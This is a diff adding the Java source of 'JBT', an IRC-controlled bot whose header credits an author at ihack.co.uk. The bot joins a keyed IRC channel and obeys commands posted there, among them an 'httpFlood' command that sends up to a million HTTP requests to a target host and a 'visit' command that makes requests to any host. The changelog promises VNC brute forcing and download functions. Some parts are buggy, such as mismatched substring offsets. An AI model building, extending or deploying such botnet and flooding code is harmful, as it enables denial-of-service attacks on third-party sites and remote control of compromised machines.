@@ -1,0 +1,304 @@
+/*
+ * @ App Name : JBT
+ * @ Version : 1.2.0
+ * @ Author : Affix
+ * @ Contact : affix@ihack.co.uk
+ * @ Website : http://ihack.co.uk
+ *
+ * @ Description :
+ *   JBT is an open source IRCBot Written by Affix
+ *   this bot will be updated by Affix frequently.
+ *   
+ * @ Changelog
+ *   [+] V1.0.0-1.2.0
+ *     [-] Added HTTP Flooder
+ *     [-] Added Visit Functions
+ *
+ * @ Coming Soon :
+ *     
+ *     [+] VNC Brute forcing
+ *     [+] Download Functions
+ *     [+] AUTH SYSTEM
+ */
+
+import java.io.*;
+import java.util.*;
+import java.net.*;
+import java.text.*;
+import javax.net.*;
+
+
+public class JBT {
+   static String os = System.getProperty("os.name");
+   private static String host = "SERVER";
+   private static final int PORT = 6667;
+   private static String nick = "JAVA|" + new Random().nextInt(1000) + 1;
+   private static String pass = "joE-32";
+   private static String chan = "#java";
+   private static String chankey = "1234";
+   private static String prefix = "!";
+   private static String ver = "1.2.0";
+   private static String target;
+   private static String local;
+    public static String ipAddrStr = "";
+   /* DO NOT EDIT BELOW THIS LINE UNLESS YOU ARE 100% POSITIVE
+    * YOU UNDERSTAND FULLY WHAT YOU ARE DOING
+    */
+   
+   public static void main(String[] args) {           
+      run();
+ 
+   }
+   
+   public static void run() {
+      Socket link = null;
+     
+      try {
+         Scanner inputFromMe = new Scanner(System.in);
+         link = new Socket(host, PORT);
+         
+           sendRawLine("PASS pass", link);
+          sendRawLine("USER "+nick+" 8 * "+nick, link);
+          sendRawLine("NICK "+nick, link);
+          sendRawLine("JOIN "+chan+" "+chankey, link);
+         
+         
+          BufferedReader in = new BufferedReader(new InputStreamReader(link.getInputStream()));
+          while(true) {
+          try {
+              SimpleDateFormat date = new SimpleDateFormat("(hh:mm:ss)");
+              String output = date.format(new Date());
+              String hai = in.readLine();
+              if (!hai.startsWith(":")) {
+                 System.out.println(output+" "+hai);
+              }
+              else
+              if (hai.startsWith(":")) {
+                 String text = getText(hai);
+                 System.out.println(output+" ("+getSender(hai)+") "+text);
+                 if (text.startsWith(prefix + "")) {
+                    command(text, getSender(hai), link, getChannel(hai));
+                 }
+              }             
+              } catch (IOException e) {
+             // No action
+              }   
+           }
+      }
+      catch(IOException e) { e.printStackTrace(); }
+     
+      finally {
+         try {
+            link.close();
+         } catch(IOException ex) {
+            System.err.println("Failed to close Socket!");
+            System.exit(1);
+         }
+      }
+   }
+
+   public static void sendNotice(String text, String person, Socket link) {
+      sendRawLine("NOTICE "+person+" :"+text, link);
+   }
+   
+   public static void command(String command, String sender, Socket link, String channel) {
+      Socket net = null;
+           
+     if (command.startsWith(prefix + "send")) {
+         sendMessage(command.substring(6), link);
+      }
+     
+      if (command.startsWith(prefix + "csend")) {
+         int x = command.indexOf(" ");
+         int y = command.indexOf(" ", x+1);
+         
+         String chan = command.substring(x+1,y);
+         String message = command.substring(y+1);
+         sendMessage(chan, message, link);
+      }
+     
+      if (command.startsWith(prefix + "join")) {
+     
+         sendRawLine("JOIN :"+command.substring(6), link);
+       }
+     
+      if (command.startsWith(prefix + "part")) {
+         sendRawLine("PART :"+command.substring(6), link);
+      }
+     
+      if (command.startsWith(prefix + "notice")) {
+         int x = -1;
+         int y = -1;
+         x= command.indexOf(" ");
+         y= command.indexOf(" ", x+1);
+         
+         if (x != -1 && y != -1)
+         sendNotice(command.substring(y+1), command.substring(x+1, y), link);
+      }
+     
+      if (command.startsWith(prefix + "ping")) {
+         sendRawLine("PING :"+command.substring(6), link);
+      }
+     
+      if (command.startsWith(prefix + "version")) {
+         sendRawLine("PRIVMSG " + chan + " : JBT Verison " + ver + " Written By Affix @ ihack.co.uk", link);
+      }
+     
+      if (command.startsWith(prefix + "reverse")) {
+         StringBuffer buffed = new StringBuffer(command.substring(8)).reverse();
+         String ra = buffed.toString();
+         sendRawLine("PRIVMSG " + chan + ":"+ra, link);
+      }
+     
+      if (command.startsWith(prefix + "rawSender")) {
+         sendRawLine(command.substring(11), link);
+      }
+      // ERROR HERE
+      if (command.startsWith(prefix + "httpFlood")) {
+         //HTTP Flood a Site
+         target = command.substring(6);
+         for(int i=1; i<1000000; i++){ //HTTP FLOOD CODE HERE
+              try {
+               net = new Socket(target, 80);
+               sendRawLine("GET / HTTP/1.1", net);
+               sendRawLine("Host: " + target, net);
+            sendRawLine("Connection: close", net);
+              }
+                 
+                 catch(UnknownHostException e)
+                 
+                 {
+                    //NO ACTION
+                 }
+                 
+                 catch(IOException e)
+                 {
+                    //NO ACTION
+                 }
+         }
+         sendRawLine("PRIVMSG " + chan + " : Flooding Completed to " + target, link);
+        }
+     
+      if (command.startsWith(prefix + "test")) {
+         int x = command.indexOf(" ");
+         int y = command.indexOf(" ", x+1);
+         
+         String type = command.substring(x+1, y);
+         String msg = command.substring(y+1);
+         
+         int type2 = Integer.parseInt(type);
+         if(x > 0 && y > 0) {
+            sendMessage(type2+msg, link);
+         }
+      }
+     
+      if (command.startsWith(prefix + "visit")) {
+         target = command.substring(6);
+             try {
+               net = new Socket(target, 80);
+               sendRawLine("GET / HTTP/1.1", net);
+               sendRawLine("Host: " + target, net);
+               sendRawLine("Connection: close", net);
+              }
+                 
+                 catch(UnknownHostException e)
+                 
+                 {
+                    //NO ACTION
+                 }
+                 
+                 catch(IOException e)
+                 {
+                    //NO ACTION
+                 }
+         sendRawLine("PRIVMSG " + chan + " : Visited Link : " + target, link);
+        }
+     
+      if (command.equalsIgnoreCase(prefix + "commands")) {
+         sendNotice(prefix + "notice name message", sender, link);
+         sendNotice(prefix + "send message", sender, link);
+         sendNotice(prefix + "reverse message", sender, link);
+         //sendNotice("", sender, link);
+      }
+     
+      if (command.equalsIgnoreCase(prefix + "shutdown")) {
+            sendRawLine("QUIT :BAI", link);
+      }
+     
+      if (command.startsWith(prefix + "setName")) {
+            sendRawLine("NICK "+command.substring(9), link);
+      }
+       
+     
+   }
+   
+   public static String getChannel(String rawtext) {
+       String text = rawtext;
+      int space1 = rawtext.indexOf(" ");
+      int space2 = -1;
+      space2 = rawtext.indexOf(" ", space1+1);
+      int space3 = -1;
+      space3 = rawtext.indexOf(" ", space2+1);
+     
+      if (space2 != -1 && space3 != -1) {
+         text = rawtext.substring(space2+1, space3);
+      }
+     
+      if (space2 == -1 && space3 == -1) {
+         text = rawtext;
+      }
+     
+      return text;     
+   }
+   
+   public static void sendMessage(String text, Socket link) {
+      sendRawLine("PRIVMSG " + chan + " :"+text, link);
+   }
+   
+   public static void sendMessage(String channel, String text, Socket link) {
+      sendRawLine("PRIVMSG " + chan + " :"+text, link);
+   }
+   
+   public static String getText(String rawtext) {
+      String text = rawtext;
+      int space1 = rawtext.indexOf(":");
+      int space2 = -1;
+      space2 = rawtext.indexOf(":", space1+1);
+     
+      if (space2 != -1) {
+         text = rawtext.substring(space2+1);
+      }
+      if (space2 == -1) {
+         text = rawtext;
+      }
+     
+      return text;
+   }
+   
+   public static String getSender(String rawtext) {
+      String text = rawtext;
+     
+      int colon1 = rawtext.indexOf(":");
+      int exclamation1 = -1;
+      exclamation1 = rawtext.indexOf(prefix + "", colon1+1);
+     
+      if (exclamation1 != -1) {
+         text = rawtext.substring(colon1+1, exclamation1);
+      }
+      else if (exclamation1 == -1) {
+         text = rawtext;
+      }
+      return text;
+   }
+   
+   public static void sendRawLine(String text, Socket sock) {
+      try {
+         BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
+         out.write(text+"\n");
+         out.flush();
+      } catch(IOException ex) {
+         ex.printStackTrace();
+      }
+   };
+     
+}
